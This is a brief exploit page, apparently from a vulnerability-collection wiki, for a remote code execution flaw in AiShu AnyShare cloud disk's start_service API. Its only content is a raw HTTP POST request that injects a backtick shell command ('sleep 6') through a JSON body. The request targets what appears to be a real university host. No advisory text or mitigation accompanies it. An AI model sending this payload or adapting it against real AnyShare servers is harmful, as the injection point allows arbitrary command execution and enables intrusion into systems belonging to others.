---
title: 爱数AnyShare爱数云盘start_service远程代码执行
description: 
published: true
date: 2025-07-04T08:49:47.720Z
tags: 
editor: markdown
dateCreated: 2025-07-04T08:49:47.720Z
---

# 爱数AnyShare爱数云盘start_service远程代码执行



```http
POST /api/ServiceAgent/start_service HTTP/1.1
Host: anyshare.shufe.edu.cn
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 13
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36

["`sleep 6`"]
```